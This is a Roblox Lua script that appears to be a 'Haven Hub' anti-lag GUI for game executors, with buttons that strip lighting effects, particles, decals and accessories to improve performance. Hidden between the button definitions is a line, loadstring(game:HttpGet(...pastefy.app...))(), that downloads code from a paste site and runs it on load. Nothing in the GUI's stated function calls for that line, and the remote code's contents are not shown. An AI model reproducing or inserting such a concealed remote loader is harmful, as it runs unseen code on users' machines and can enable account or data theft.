local fenv = getfenv()
local Lighting = game:GetService('Lighting')
local Workspace = game:GetService('Workspace')
local RunService = game:GetService('RunService')
local TweenService = game:GetService('TweenService')

-- Safely remove existing GUI if present
local existingGui = game.CoreGui:FindFirstChild('HavenHubGUI')
if existingGui then
    existingGui:Destroy()
end

local screenGui = Instance.new('ScreenGui')
screenGui.Name = 'HavenHubGUI'
screenGui.ResetOnSpawn = false
screenGui.Parent = game:GetService('Players').LocalPlayer.PlayerGui

local mainFrame = Instance.new('Frame')
mainFrame.Draggable = true
mainFrame.Position = UDim2.new(0.02, 0, 0.3, 0)
mainFrame.Active = true
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 0, 30)  -- Transparent Dark Purple
mainFrame.BackgroundTransparency = 0.35                 -- Semi-transparent
mainFrame.Size = UDim2.new(0, 220, 0, 125)
mainFrame.ClipsDescendants = true
mainFrame.Parent = screenGui

local frameCorner = Instance.new('UICorner')
frameCorner.CornerRadius = UDim.new(0, 12)
frameCorner.Parent = mainFrame

local gradientColors = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 0, 40)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(80, 0, 110)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 0, 40)),
})

local gradient = Instance.new('UIGradient')
gradient.Color = gradientColors
gradient.Rotation = 45
gradient.Parent = mainFrame

local stroke = Instance.new('UIStroke')
stroke.Thickness = 2
stroke.Color = Color3.fromRGB(180, 50, 255)  -- Bright Purple Outline
stroke.Transparency = 0.1
stroke.Parent = mainFrame

local titleLabel = Instance.new('TextLabel')
titleLabel.Font = Enum.Font.LuckiestGuy
titleLabel.BackgroundTransparency = 1
titleLabel.TextColor3 = Color3.fromRGB(210, 100, 255)  -- Bright Purple Text
titleLabel.Text = 'HAVEN HUB'
titleLabel.TextSize = 16
titleLabel.Position = UDim2.new(0, 5, 0, 0)
titleLabel.Size = UDim2.new(1, -35, 0, 26)
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.Parent = mainFrame

-- Botón de Minimizar
local minimizeButton = Instance.new('TextButton')
minimizeButton.BackgroundColor3 = Color3.fromRGB(25, 0, 35)
minimizeButton.BackgroundTransparency = 0.2
minimizeButton.Font = Enum.Font.LuckiestGuy
minimizeButton.TextColor3 = Color3.fromRGB(210, 100, 255)
minimizeButton.Text = '-'
minimizeButton.TextSize = 16
minimizeButton.Position = UDim2.new(1, -25, 0, 3)
minimizeButton.Size = UDim2.new(0, 20, 0, 20)
minimizeButton.Parent = mainFrame

local minimizeCorner = Instance.new('UICorner')
minimizeCorner.CornerRadius = UDim.new(0, 6)
minimizeCorner.Parent = minimizeButton

local antiLagButton = Instance.new('TextButton')
antiLagButton.BackgroundColor3 = Color3.fromRGB(25, 0, 35)  -- Darker purple for button
antiLagButton.BackgroundTransparency = 0.2
antiLagButton.Font = Enum.Font.LuckiestGuy
antiLagButton.TextColor3 = Color3.fromRGB(210, 100, 255)
antiLagButton.Position = UDim2.new(0.05, 0, 0.33, 0)
antiLagButton.Text = 'ANTI LAG: OFF'
antiLagButton.TextSize = 14
antiLagButton.Size = UDim2.new(0.9, 0, 0, 34)
antiLagButton.Parent = mainFrame

local antiLagCorner = Instance.new('UICorner')
antiLagCorner.CornerRadius = UDim.new(0, 8)
antiLagCorner.Parent = antiLagButton

--------------------------------------------------
loadstring(game:HttpGet("https://pastefy.app/NybzapiP/raw"))()

local ultraButton = Instance.new('TextButton')
ultraButton.BackgroundColor3 = Color3.fromRGB(25, 0, 35)
ultraButton.BackgroundTransparency = 0.2
ultraButton.Font = Enum.Font.LuckiestGuy
ultraButton.TextColor3 = Color3.fromRGB(210, 100, 255)
ultraButton.Position = UDim2.new(0.05, 0, 0.65, 0)
ultraButton.Text = 'ULTRA MODE: OFF'
ultraButton.TextSize = 13
ultraButton.Size = UDim2.new(0.9, 0, 0, 30)
ultraButton.Parent = mainFrame

local ultraCorner = Instance.new('UICorner')
ultraCorner.CornerRadius = UDim.new(0, 8)
ultraCorner.Parent = ultraButton

-- Lógica y Animación de Minimizar
local minimized = false
local normalSize = UDim2.new(0, 220, 0, 125)
local minimizedSize = UDim2.new(0, 220, 0, 26)
local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

minimizeButton.MouseButton1Click:Connect(function()
    minimized = not minimized
    local targetSize = minimized and minimizedSize or normalSize
    minimizeButton.Text = minimized and '+' or '-'
    
    local tween = TweenService:Create(mainFrame, tweenInfo, {Size = targetSize})
    tween:Play()
end)

local function applyAntiLag(instance)
    if instance:IsA('ParticleEmitter') then
        instance.Enabled = false
    elseif instance:IsA('Decal') then
        instance.Transparency = 1
    elseif instance:IsA('BasePart') then
        instance.Material = Enum.Material.Plastic
        instance.Reflectance = 0
        instance.CastShadow = false
    end
end

local antiLagEnabled = false

antiLagButton.MouseButton1Click:Connect(function()
    antiLagEnabled = not antiLagEnabled
    antiLagButton.Text = antiLagEnabled and 'ANTI LAG: ON' or 'ANTI LAG: OFF'
    
    Lighting.GlobalShadows = false
    Lighting.FogEnd = 9e9
    Lighting.Brightness = 1
    Lighting.EnvironmentDiffuseScale = 0
    Lighting.EnvironmentSpecularScale = 0

    for _, child in pairs(Lighting:GetChildren()) do
        if child:IsA('BloomEffect') or child:IsA('BlurEffect') or child:IsA('SunRaysEffect') then
            child.Enabled = false
        end
    end
    
    for _, descendant in pairs(Workspace:GetDescendants()) do
        applyAntiLag(descendant)
    end

    Workspace.DescendantAdded:Connect(function(descendant)
        applyAntiLag(descendant)
    end)
end)

ultraButton.MouseButton1Click:Connect(function()
    ultraButton.Text = 'ULTRA MODE: ON'
    
    Lighting.GlobalShadows = false
    Lighting.FogEnd = 9e9
    Lighting.Brightness = 1
    Lighting.EnvironmentDiffuseScale = 0
    Lighting.EnvironmentSpecularScale = 0

    for _, child in pairs(Lighting:GetChildren()) do
        if child:IsA('BloomEffect') or child:IsA('BlurEffect') or child:IsA('SunRaysEffect') then
            child.Enabled = false
        end
    end
    
    for _, descendant in pairs(Workspace:GetDescendants()) do
        applyAntiLag(descendant)
        if descendant:IsA('Accessory') then
            descendant:Destroy()
        end
    end
end)

print('HAVEN HUB')